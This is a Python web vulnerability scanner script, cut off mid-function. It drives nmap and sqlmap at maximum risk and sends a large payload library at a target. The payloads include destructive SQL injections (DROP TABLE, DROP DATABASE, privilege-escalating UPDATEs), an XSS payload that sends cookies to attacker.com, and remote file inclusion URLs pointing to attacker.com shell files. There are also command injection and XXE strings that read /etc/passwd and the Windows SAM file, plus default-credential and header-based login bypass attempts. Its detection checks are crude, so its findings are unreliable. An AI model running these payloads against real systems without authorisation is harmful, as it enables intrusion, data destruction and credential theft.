#!/usr/bin/env python3
"""
Advanced Vulnerability Scanner with Nmap, SQLmap, and Advanced Payloads
Full enumeration with deep scanning capabilities
"""

import os
import sys
import json
import socket
import ssl
import subprocess
import requests
import time
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import base64
import hashlib
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import shutil

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedVulnerabilityScanner:
    def __init__(self, target_ip, target_url):
        self.target_ip = target_ip
        self.target_url = target_url.rstrip('/')
        self.results = {
            'scan_time': datetime.now().isoformat(),
            'target_ip': target_ip,
            'target_url': target_url,
            'findings': {
                'port_scan': [],
                'nmap_scan': {},
                'ssl_tls': {},
                'web_vulnerabilities': [],
                'headers': {},
                'services': [],
                'directories': [],
                'admin_panels': [],
                'misconfigurations': [],
                'weak_credentials': [],
                'sql_injection': [],
                'authentication_bypass': [],
                'advanced_payloads': [],
                'cves': [],
                'http_methods': [],
                'dns_info': {}
            },
            'risk_level': 'LOW',
            'summary': {},
            'tools_used': []
        }
        
        # Advanced payloads library
        self.payloads = self._initialize_payloads()
        
        # Setup session with retries
        self.session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Check for external tools
        self.tools = {
            'nmap': self._check_tool('nmap'),
            'sqlmap': self._check_tool('sqlmap'),
            'nikto': self._check_tool('nikto'),
            'wfuzz': self._check_tool('wfuzz')
        }
    
    def _check_tool(self, tool_name):
        """Check if external tool is installed"""
        return shutil.which(tool_name) is not None
    
    def _initialize_payloads(self):
        """Initialize comprehensive payload library"""
        return {
            'sql_injection': {
                'basic': [
                    "' OR '1'='1",
                    "' OR 1=1 --",
                    "admin' --",
                    "' OR 'a'='a",
                    "1' ORDER BY 1--",
                    "1' ORDER BY 2--",
                    "1' ORDER BY 3--",
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--"
                ],
                'time_based': [
                    "1' AND SLEEP(5)--",
                    "1' AND BENCHMARK(5000000, MD5('test'))--",
                    "1' AND WAITFOR DELAY '00:00:05'--",
                    "1' AND pg_sleep(5)--",
                    "1' OR SLEEP(5)--"
                ],
                'advanced': [
                    "admin' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--",
                    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))--",
                    "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION())), 1)--",
                    "1' WHERE 1 UNION SELECT USER(), DATABASE(), VERSION()--",
                    "1' UNION SELECT @@version,@@datadir,@@version_compile_os--",
                    "1' AND JSON_EXTRACT('{\"a\":1}', '$.a')=1--",
                    "1'; DROP TABLE users;--",
                    "1' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS CHAR)--"
                ],
                'error_based': [
                    "1' AND extractvalue(1, concat(0x7e, version()))--",
                    "1' AND updatexml(1, concat(0x7e, version()), 1)--",
                    "1' AND !(0^0) AND '1'='1",
                    "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
                    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), 0x7e, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)--"
                ],
                'stacked_queries': [
                    "1'; SELECT * FROM users;--",
                    "1'; DROP DATABASE test;--",
                    "1'; UPDATE users SET admin=1;--",
                    "1'; INSERT INTO users VALUES('hacker','pass',1);--"
                ]
            },
            'xss': {
                'basic': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '"><script>alert("XSS")</script>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>'
                ],
                'dom_based': [
                    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                    '\'><svg/onload=alert(String.fromCharCode(88,83,83))>',
                    '"><img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
                    '<input onfocus=alert(1) autofocus>',
                    '<marquee onstart=alert(1)>'
                ],
                'encoded': [
                    '&lt;script&gt;alert(1)&lt;/script&gt;',
                    '&#60;script&#62;alert(1)&#60;/script&#62;',
                    '\u003cscript\u003ealert(1)\u003c/script\u003e',
                    '%3Cscript%3Ealert(1)%3C/script%3E'
                ],
                'advanced': [
                    '<svg/onload=this.innerHTML=\'<img src=x onerror=alert(1)>\'>',
                    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
                    '<details open ontoggle=alert(1)>',
                    '<object data="data:text/html,<script>alert(1)</script>">',
                    '<embed src="data:text/html,<script>alert(1)</script>">',
                    '<iframe srcdoc="<script>alert(1)</script>">',
                    '<body onload="alert(1)">',
                    '<img src=x onerror="console.log(String.fromCharCode(88,83,83))">'
                ],
                'context_escape': [
                    '"/><script>alert(1)</script>',
                    '\'-alert(1)-\'',
                    '`);alert(1);//',
                    'javascript:alert(1)',
                    'data:text/html,<script>alert(1)</script>'
                ]
            },
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/ssl/private/ca-certificates.crt',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\Windows\\win.ini',
                '....//....//....//etc/passwd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '/etc/passwd%00',
                '/etc/passwd%2500'
            ],
            'rfi': [
                'http://attacker.com/shell.php',
                'http://attacker.com/payload.txt',
                'https://attacker.com/malicious.php?cmd=id'
            ],
            'authentication_bypass': [
                {'username': "' OR '1'='1", 'password': "' OR '1'='1"},
                {'username': 'admin', 'password': "' OR '1'='1"},
                {'username': "' OR '1'='1", 'password': 'admin'},
                {'username': 'admin', 'password': 'admin'},
                {'username': 'administrator', 'password': 'administrator'},
                {'username': 'root', 'password': 'root'},
                {'username': 'admin', 'password': ''},
                {'username': '', 'password': 'admin'},
                {'username': 'test', 'password': 'test'},
                {'username': 'guest', 'password': 'guest'},
                {'username': 'null', 'password': 'null'},
                {'username': "admin'--", 'password': 'anything'},
                {'username': "admin' #", 'password': 'anything'},
                {'username': "' OR 1=1 --", 'password': ''},
                {'username': 'admin', 'password': 'password123'},
            ],
            'command_injection': [
                '; id',
                '| id',
                '|| id',
                '& id',
                '&& id',
                '`id`',
                '$(id)',
                '\n id',
                '\r id',
                '; whoami;',
                '| whoami |',
                '$(whoami)',
                '`whoami`',
                '; ls -la',
                '| cat /etc/passwd',
                '; dir',
                '| type C:\\Windows\\System32\\config\\sam'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
            ],
            'template_injection': [
                '${7*7}',
                '${7*\'7\'}',
                '<%= 7*7 %>',
                '#{7*7}',
                '*{7*7}',
                '${InjectedObject.toString()}',
                '[[${7*7}]]',
                '${T(java.lang.Runtime).getRuntime().exec(\'id\')}'
            ]
        }
    
    def log(self, message, level='INFO'):
        """Print timestamped log message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def run_full_scan(self):
        """Execute full vulnerability scan with all advanced features"""
        print("\n" + "="*70)
        print("🔍 ADVANCED VULNERABILITY SCANNER - FULL ENUMERATION")
        print("="*70 + "\n")
        
        try:
            self.log("Starting comprehensive advanced vulnerability scan...")
            self.log(f"Tools available: {', '.join([k for k,v in self.tools.items() if v])}", "INFO")
            
            # Phase 1: Network & DNS Enumeration
            self.log("Phase 1: Network and DNS Enumeration", "SCAN")
            self.dns_enumeration()
            self.get_host_info()
            
            # Phase 2: Nmap Scanning
            if self.tools['nmap']:
                self.log("Phase 2: Advanced Nmap Scanning", "SCAN")
                self.nmap_scan()
                self.results['tools_used'].append('nmap')
            else:
                self.log("Phase 2: Port Scanning (Nmap not available)", "SCAN")
                self.port_scan()
            
            # Phase 3: Service Detection
            self.log("Phase 3: Service Detection and Version Enumeration", "SCAN")
            self.service_detection()
            
            # Phase 4: SSL/TLS Analysis
            self.log("Phase 4: SSL/TLS Certificate and Cipher Analysis", "SCAN")
            self.ssl_tls_analysis()
            
            # Phase 5: HTTP Methods & Headers
            self.log("Phase 5: HTTP Methods and Header Analysis", "SCAN")
            self.http_methods_check()
            self.headers_analysis()
            
            # Phase 6: Advanced Web Scanning
            self.log("Phase 6: Advanced Web Application Vulnerability Scanning", "SCAN")
            self.advanced_payload_injection()
            
            # Phase 7: SQL Injection (with SQLmap if available)
            self.log("Phase 7: SQL Injection Testing", "SCAN")
            if self.tools['sqlmap']:
                self.sqlmap_scan()
                self.results['tools_used'].append('sqlmap')
            else:
                self.sql_injection_scan()
            
            # Phase 8: Authentication Bypass
            self.log("Phase 8: Authentication Bypass Testing", "SCAN")
            self.authentication_bypass_testing()
            
            # Phase 9: XSS & Advanced Payloads
            self.log("Phase 9: XSS and Advanced Payload Testing", "SCAN")
            self.xss_scan()
            self.command_injection_scan()
            self.xxe_scan()
            self.template_injection_scan()
            
            # Phase 10: Directory & File Enumeration
            self.log("Phase 10: Directory and Admin Panel Enumeration", "SCAN")
            self.directory_enumeration()
            self.admin_panel_detection()
            self.lfi_scan()
            
            # Phase 11: Misconfigurations
            self.log("Phase 11: Misconfiguration Detection", "SCAN")
            self.check_misconfigurations()
            
            # Phase 12: Default Credentials
            self.log("Phase 12: Default Credentials Check", "SCAN")
            self.check_default_credentials()
            
            # Phase 13: CVE Detection
            self.log("Phase 13: Known CVE Detection", "SCAN")
            self.cve_detection()
            
            # Calculate risk level
            self.calculate_risk_level()
            
            self.log("✅ Scan completed successfully", "SUCCESS")
            return self.results
            
        except Exception as e:
            self.log(f"❌ Scan failed: {str(e)}", "ERROR")
            return self.results
    
    def dns_enumeration(self):
        """Enumerate DNS information"""
        try:
            self.log("Enumerating DNS records...")
            
            try:
                a_record = socket.gethostbyname(self.target_ip)
                self.results['findings']['dns_info']['a_record'] = a_record
                self.log(f"  → A Record: {a_record}", "INFO")
            except:
                pass
            
            try:
                reverse_dns = socket.gethostbyaddr(self.target_ip)
                self.results['findings']['dns_info']['reverse_dns'] = reverse_dns[0]
                self.log(f"  → Reverse DNS: {reverse_dns[0]}", "INFO")
            except:
                pass
            
            common_subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 
                               'backup', 'legacy', 'old', 'internal', 'vpn', 'remote']
            domain = self.target_url.split('://')[-1].split('/')[0].split(':')[0]
            subdomains_found = []
            
            for subdomain in common_subdomains:
                try:
                    test_host = f"{subdomain}.{domain}"
                    ip = socket.gethostbyname(test_host)
                    subdomains_found.append({subdomain: ip})
                    self.log(f"  → Subdomain found: {test_host} → {ip}", "INFO")
                except:
                    pass
            
            if subdomains_found:
                self.results['findings']['dns_info']['subdomains'] = subdomains_found
                
        except Exception as e:
            self.log(f"  ✗ DNS enumeration error: {str(e)}", "WARN")
    
    def get_host_info(self):
        """Get basic host information"""
        try:
            self.log("Gathering host information...")
            
            try:
                hostname = socket.gethostname()
                self.results['findings']['dns_info']['hostname'] = hostname
                self.log(f"  → Hostname: {hostname}", "INFO")
            except:
                pass
            
            try:
                all_ips = socket.gethostbyname_ex(self.target_ip)
                self.results['findings']['dns_info']['all_ips'] = all_ips[2] if len(all_ips) > 2 else []
            except:
                pass
                
        except Exception as e:
            self.log(f"  ✗ Host info error: {str(e)}", "WARN")
    
    def nmap_scan(self):
        """Run advanced Nmap scan"""
        try:
            self.log("Running advanced Nmap scan...")
            
            # Comprehensive nmap command
            nmap_args = [
                'nmap',
                '-sV',           # Version detection
                '-sC',           # Default scripts
                '-O',            # OS detection
                '-A',            # Aggressive scan
                '-p-',           # All ports
                '--script=vuln', # Vulnerability scripts
                '-oX', '-',      # XML output
                self.target_ip
            ]
            
            try:
                result = subprocess.run(nmap_args, capture_output=True, text=True, timeout=300)
                self.results['findings']['nmap_scan']['output'] = result.stdout
                self.results['findings']['nmap_scan']['error'] = result.stderr
                
                # Parse nmap output for open ports
                ports = re.findall(r'(\d+)/tcp\s+open', result.stdout)
                self.results['findings']['port_scan'] = list(set([int(p) for p in ports]))
                
                self.log(f"  ✓ Nmap scan completed. Found {len(self.results['findings']['port_scan'])} open ports", "SUCCESS")
                
            except subprocess.TimeoutExpired:
                self.log("  ✗ Nmap scan timed out", "WARN")
            except Exception as e:
                self.log(f"  ✗ Nmap scan error: {str(e)}", "WARN")
        
        except Exception as e:
            self.log(f"  ✗ Nmap scan error: {str(e)}", "WARN")
    
    def port_scan(self):
        """Fallback port scan if Nmap not available"""
        try:
            self.log("Scanning ports (top 100 common ports)...")
            
            common_ports = [
                20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995,
                1433, 1521, 3306, 3389, 5432, 5984, 6379, 7001, 8000, 8080, 8443,
                8888, 9000, 9200, 9300, 11211, 27017, 27018, 27019, 50070, 4444,
                5555, 6666, 7777, 8888, 9999, 10000, 10001, 15672, 25565, 3000,
                5000, 9090, 8081, 8082, 8083, 8084, 8085, 2222, 2323, 3333, 4444,
                5001, 5555, 5900, 6000, 6001, 6005, 7000, 7001, 7199, 8008, 8009,
                9001, 9002, 9090, 10000, 10001, 10002, 11211, 27017, 27018, 27019,
                28017, 50000, 50070
            ]
            
            open_ports = []
            
            def check_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((self.target_ip, port))
                    sock.close()
                    if result == 0:
                        return port
                except:
                    pass
                return None
            
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = [executor.submit(check_port, port) for port in common_ports]
                for future in as_completed(futures):
                    port = future.result()
                    if port:
                        open_ports.append(port)
                        self.log(f"  ✓ Port {port} OPEN", "SUCCESS")
            
            self.results['findings']['port_scan'] = sorted(open_ports)
            
        except Exception as e:
            self.log(f"  ✗ Port scan error: {str(e)}", "WARN")
    
    def service_detection(self):
        """Detect running services"""
        try:
            self.log("Detecting services and versions...")
            
            open_ports = self.results['findings']['port_scan']
            service_map = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
                3306: 'MySQL', 5432: 'PostgreSQL', 3389: 'RDP', 1433: 'MSSQL',
                1521: 'Oracle', 6379: 'Redis', 9200: 'Elasticsearch',
                27017: 'MongoDB', 5984: 'CouchDB', 11211: 'Memcached',
                4444: 'Unknown', 5555: 'Unknown', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
            }
            
            for port in open_ports:
                service = service_map.get(port, f'Unknown Service')
                self.results['findings']['services'].append({
                    'port': port,
                    'service': service
                })
                self.log(f"  → Port {port}: {service}", "INFO")
            
        except Exception as e:
            self.log(f"  ✗ Service detection error: {str(e)}", "WARN")
    
    def ssl_tls_analysis(self):
        """Analyze SSL/TLS certificates and ciphers"""
        try:
            self.log("Analyzing SSL/TLS configuration...")
            
            parsed = urlparse(self.target_url)
            hostname = parsed.netloc.split(':')[0]
            port = int(parsed.netloc.split(':')[1]) if ':' in parsed.netloc else 443
            
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        version = ssock.version()
                        
                        self.results['findings']['ssl_tls']['certificate'] = {
                            'subject': dict(x[0] for x in cert.get('subject', [])),
                            'issuer': dict(x[0] for x in cert.get('issuer', [])),
                            'version': cert.get('version'),
                            'notBefore': cert.get('notBefore'),
                            'notAfter': cert.get('notAfter'),
                            'serialNumber': cert.get('serialNumber')
                        }
                        
                        self.results['findings']['ssl_tls']['cipher'] = {
                            'name': cipher[0],
                            'protocol': cipher[1],
                            'strength': cipher[2]
                        }
                        
                        self.results['findings']['ssl_tls']['protocol_version'] = version
                        
                        if version in ['SSLv2', 'SSLv3']:
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': 'Insecure SSL/TLS Version',
                                'severity': 'HIGH',
                                'description': f'Target uses {version} which is vulnerable',
                                'recommendation': 'Upgrade to TLS 1.2 or higher'
                            })
                        
                        self.log(f"  → Protocol: {version}", "INFO")
                        self.log(f"  → Cipher: {cipher[0]}", "INFO")
                        
            except Exception as e:
                self.results['findings']['ssl_tls']['error'] = str(e)
                self.log(f"  ✗ Could not retrieve SSL/TLS info: {str(e)}", "WARN")
        
        except Exception as e:
            self.log(f"  ✗ SSL/TLS analysis error: {str(e)}", "WARN")
    
    def http_methods_check(self):
        """Check for dangerous HTTP methods"""
        try:
            self.log("Checking HTTP methods...")
            
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
            
            for method in methods:
                try:
                    response = self.session.request(method, self.target_url, timeout=5, verify=False, allow_redirects=False)
                    
                    if response.status_code != 405:
                        self.results['findings']['http_methods'].append({
                            'method': method,
                            'status': response.status_code,
                            'allowed': True
                        })
                        self.log(f"  ✓ {method} allowed (Status: {response.status_code})", "INFO")
                        
                        if method in ['DELETE', 'PUT', 'TRACE']:
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': f'Dangerous HTTP Method: {method}',
                                'severity': 'MEDIUM',
                                'description': f'{method} method is enabled',
                                'recommendation': f'Disable {method} method on production'
                            })
                except requests.exceptions.Timeout:
                    pass
                except:
                    pass
            
        except Exception as e:
            self.log(f"  ✗ HTTP methods check error: {str(e)}", "WARN")
    
    def headers_analysis(self):
        """Analyze HTTP response headers for security issues"""
        try:
            self.log("Analyzing HTTP response headers...")
            
            response = self.session.get(self.target_url, timeout=10, verify=False)
            headers = response.headers
            
            self.results['findings']['headers'] = dict(headers)
            
            security_headers = [
                'Strict-Transport-Security',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Referrer-Policy'
            ]
            
            missing_headers = []
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)
            
            if missing_headers:
                self.results['findings']['web_vulnerabilities'].append({
                    'type': 'Missing Security Headers',
                    'severity': 'MEDIUM',
                    'description': f'Missing headers: {", ".join(missing_headers)}',
                    'recommendation': 'Implement recommended security headers'
                })
                self.log(f"  ⚠ Missing headers: {', '.join(missing_headers)}", "WARN")
            
            dangerous_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Runtime-Version']
            for header in dangerous_headers:
                if header in headers:
                    self.results['findings']['web_vulnerabilities'].append({
                        'type': 'Information Disclosure',
                        'severity': 'LOW',
                        'description': f'{header}: {headers[header]}',
                        'recommendation': f'Remove {header} header'
                    })
                    self.log(f"  ⚠ Info disclosure: {header} = {headers[header]}", "WARN")
            
        except Exception as e:
            self.log(f"  ✗ Headers analysis error: {str(e)}", "WARN")
    
    def advanced_payload_injection(self):
        """Test with advanced payload library"""
        try:
            self.log("Testing advanced payload injection attacks...")
            
            test_params = ['id', 'search', 'q', 'user', 'name', 'query', 'term']
            
            for param in test_params:
                for payload_category, payloads in self.payloads.items():
                    if isinstance(payloads, dict):
                        for category_type, payload_list in payloads.items():
                            if isinstance(payload_list, list):
                                for payload in payload_list[:3]:  # Test first 3 of each
                                    try:
                                        test_params_dict = {param: payload}
                                        response = self.session.get(self.target_url, params=test_params_dict, 
                                                                   timeout=5, verify=False)
                                        
                                        # Check response for indicators
                                        if self._check_payload_response(response, payload):
                                            self.results['findings']['advanced_payloads'].append({
                                                'category': payload_category,
                                                'type': category_type,
                                                'payload': payload,
                                                'parameter': param,
                                                'severity': 'HIGH'
                                            })
                                            self.log(f"  ⚠ Advanced payload detected: {payload_category}", "WARN")
                                    except:
                                        pass
        
        except Exception as e:
            self.log(f"  ✗ Advanced payload injection error: {str(e)}", "WARN")
    
    def _check_payload_response(self, response, payload):
        """Check if payload is reflected in response"""
        if payload in response.text:
            return True
        
        # Check for error messages
        error_indicators = ['syntax', 'error', 'exception', 'warning', 'fatal', 'notice']
        if any(indicator in response.text.lower() for indicator in error_indicators):
            return True
        
        return False
    
    def sql_injection_scan(self):
        """Test for SQL Injection vulnerabilities"""
        try:
            self.log("Testing for SQL Injection vulnerabilities...")
            
            test_urls = [
                self.target_url,
                f"{self.target_url}/search",
                f"{self.target_url}/login",
                f"{self.target_url}/user",
                f"{self.target_url}/product",
                f"{self.target_url}/page"
            ]
            
            for test_url in test_urls:
                for payload_category, payloads in self.payloads['sql_injection'].items():
                    for payload in payloads:
                        try:
                            test_params = {
                                'id': payload,
                                'search': payload,
                                'user': payload,
                                'query': payload
                            }
                            response = self.session.get(test_url, params=test_params, timeout=5, verify=False)
                            
                            sql_errors = [
                                'SQL syntax', 'MySQL', 'PostgreSQL', 'SQL Server',
                                'OracleError', 'Syntax error', 'ODBC', 'Database error',
                                'MSSQL', 'SQLState', 'odbc_error'
                            ]
                            
                            for error in sql_errors:
                                if error.lower() in response.text.lower():
                                    self.results['findings']['sql_injection'].append({
                                        'type': 'SQL Injection',
                                        'category': payload_category,
                                        'severity': 'CRITICAL',
                                        'url': test_url,
                                        'payload': payload,
                                        'error_found': error,
                                        'description': 'SQL injection vulnerability detected',
                                        'recommendation': 'Use parameterized queries and input validation'
                                    })
                                    self.log(f"  ⚠ Potential SQLi found at {test_url}", "WARN")
                                    break
                        except:
                            pass
            
        except Exception as e:
            self.log(f"  ✗ SQL injection scan error: {str(e)}", "WARN")
    
    def sqlmap_scan(self):
        """Run SQLmap for automated SQL injection testing"""
        try:
            self.log("Running SQLmap automated SQL injection scan...")
            
            sqlmap_args = [
                'sqlmap',
                '-u', self.target_url,
                '--batch',
                '--risk=3',
                '--level=5',
                '-v', '1',
                '--techniques=BEUSTQ'
            ]
            
            try:
                result = subprocess.run(sqlmap_args, capture_output=True, text=True, timeout=300)
                self.results['findings']['sql_injection'].append({
                    'tool': 'sqlmap',
                    'output': result.stdout,
                    'errors': result.stderr
                })
                
                if 'vulnerable' in result.stdout.lower():
                    self.log("  ⚠ SQL injection vulnerability found by SQLmap", "WARN")
                else:
                    self.log("  ✓ SQLmap scan completed", "SUCCESS")
                
            except subprocess.TimeoutExpired:
                self.log("  ✗ SQLmap scan timed out", "WARN")
            except Exception as e:
                self.log(f"  ✗ SQLmap error: {str(e)}", "WARN")
        
        except Exception as e:
            self.log(f"  ✗ SQLmap scan error: {str(e)}", "WARN")
    
    def authentication_bypass_testing(self):
        """Test for authentication bypass vulnerabilities"""
        try:
            self.log("Testing authentication bypass techniques...")
            
            login_urls = [
                f"{self.target_url}/login",
                f"{self.target_url}/admin/login",
                f"{self.target_url}/user/login",
                f"{self.target_url}/api/login",
                f"{self.target_url}/authenticate"
            ]
            
            bypass_headers = [
                {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin in base64
                {'X-Admin': 'true'},
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Original-URL': '/admin'},
                {'X-Rewrite-URL': '/admin'}
            ]
            
            for login_url in login_urls:
                # Test with bypass headers
                for headers in bypass_headers:
                    try:
                        response = self.session.get(login_url, headers=headers, timeout=5, verify=False)
                        if response.status_code == 200 and 'login' not in response.text.lower():
                            self.results['findings']['authentication_bypass'].append({
                                'url': login_url,
                                'method': 'Header Bypass',
                                'header': str(headers),
                                'status_code': response.status_code,
                                'severity': 'CRITICAL'
                            })
                            self.log(f"  ⚠ Possible auth bypass via header: {headers}", "WARN")
                    except:
                        pass
                
                # Test with default credentials
                for creds in self.payloads['authentication_bypass']:
                    try:
                        response = self.session.post(login_url, data=creds, timeout=5, verify=False)
                        
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'user_id']
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            self.results['findings']['authentication_bypass'].append({
                                'url': login_url,
                                'method': 'Default Credentials',
                                'username': creds['username'],
                                'password': creds['password'],
                                'severity': 'CRITICAL'
                            })
                            self.log(f"  ⚠ Auth bypass with creds: {creds['username']}:{creds['password']}", "WARN")
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ Authentication bypass testing error: {str(e)}", "WARN")
    
    def xss_scan(self):
        """Test for XSS vulnerabilities with advanced payloads"""
        try:
            self.log("Testing for XSS vulnerabilities...")
            
            test_urls = [
                f"{self.target_url}/search",
                f"{self.target_url}/comments",
                f"{self.target_url}/feedback",
                f"{self.target_url}/user"
            ]
            
            for test_url in test_urls:
                for xss_type, payloads in self.payloads['xss'].items():
                    for payload in payloads[:5]:  # Test first 5 of each type
                        try:
                            test_params = {
                                'q': payload,
                                'search': payload,
                                'comment': payload,
                                'text': payload
                            }
                            response = self.session.get(test_url, params=test_params, timeout=5, verify=False)
                            
                            if payload in response.text or self._is_xss_reflected(response, payload):
                                self.results['findings']['web_vulnerabilities'].append({
                                    'type': f'Cross-Site Scripting (XSS) - {xss_type}',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': 'XSS payload reflected in response',
                                    'recommendation': 'Implement output encoding and CSP'
                                })
                                self.log(f"  ⚠ Potential {xss_type} XSS found", "WARN")
                                break
                        except:
                            pass
            
        except Exception as e:
            self.log(f"  ✗ XSS scan error: {str(e)}", "WARN")
    
    def _is_xss_reflected(self, response, payload):
        """Check if XSS payload is reflected"""
        if '<script>' in payload.lower() and '<script>' in response.text.lower():
            return True
        if 'onerror' in payload.lower() and 'onerror' in response.text.lower():
            return True
        return False
    
    def command_injection_scan(self):
        """Test for command injection vulnerabilities"""
        try:
            self.log("Testing for command injection vulnerabilities...")
            
            test_urls = [
                f"{self.target_url}/exec",
                f"{self.target_url}/run",
                f"{self.target_url}/system",
                f"{self.target_url}/command",
                f"{self.target_url}/api/exec"
            ]
            
            for test_url in test_urls:
                for payload in self.payloads['command_injection']:
                    try:
                        test_params = {
                            'cmd': payload,
                            'command': payload,
                            'exec': payload,
                            'input': payload
                        }
                        response = self.session.get(test_url, params=test_params, timeout=5, verify=False)
                        
                        ci_indicators = ['root', 'bin', 'sh', 'bash', 'cmd.exe', 'powershell']
                        if any(indicator in response.text for indicator in ci_indicators):
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': 'Command Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'description': 'Possible command injection vulnerability',
                                'recommendation': 'Avoid executing system commands with user input'
                            })
                            self.log(f"  ⚠ Potential command injection found", "WARN")
                            break
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ Command injection scan error: {str(e)}", "WARN")
    
    def xxe_scan(self):
        """Test for XXE vulnerabilities"""
        try:
            self.log("Testing for XXE vulnerabilities...")
            
            xml_endpoints = [
                f"{self.target_url}/api/xml",
                f"{self.target_url}/upload",
                f"{self.target_url}/import"
            ]
            
            for endpoint in xml_endpoints:
                for payload in self.payloads['xxe']:
                    try:
                        headers = {'Content-Type': 'application/xml'}
                        response = self.session.post(endpoint, data=payload, headers=headers, 
                                                    timeout=5, verify=False)
                        
                        if 'root:' in response.text or '/bin/bash' in response.text:
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': 'XML External Entity (XXE) Injection',
                                'severity': 'CRITICAL',
                                'url': endpoint,
                                'payload': payload,
                                'description': 'XXE injection vulnerability detected',
                                'recommendation': 'Disable external entities in XML parser'
                            })
                            self.log(f"  ⚠ Potential XXE found", "WARN")
                            break
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ XXE scan error: {str(e)}", "WARN")
    
    def template_injection_scan(self):
        """Test for Template Injection vulnerabilities"""
        try:
            self.log("Testing for Template Injection vulnerabilities...")
            
            test_urls = [
                f"{self.target_url}/search",
                f"{self.target_url}/template",
                f"{self.target_url}/render"
            ]
            
            for test_url in test_urls:
                for payload in self.payloads['template_injection']:
                    try:
                        test_params = {'template': payload, 'input': payload}
                        response = self.session.get(test_url, params=test_params, timeout=5, verify=False)
                        
                        # Check for mathematical results
                        if '49' in response.text or '7' in response.text:  # ${7*7} = 49
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': 'Server-Side Template Injection (SSTI)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'description': 'Template injection vulnerability detected',
                                'recommendation': 'Sanitize template inputs and use safe template engines'
                            })
                            self.log(f"  ⚠ Potential SSTI found", "WARN")
                            break
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ Template injection scan error: {str(e)}", "WARN")
    
    def lfi_scan(self):
        """Test for Local File Inclusion vulnerabilities"""
        try:
            self.log("Testing for Local File Inclusion vulnerabilities...")
            
            test_urls = [
                f"{self.target_url}/file",
                f"{self.target_url}/include",
                f"{self.target_url}/page",
                f"{self.target_url}/view"
            ]
            
            for test_url in test_urls:
                for payload in self.payloads['lfi'][:5]:
                    try:
                        test_params = {'file': payload, 'page': payload, 'include': payload}
                        response = self.session.get(test_url, params=test_params, timeout=5, verify=False)
                        
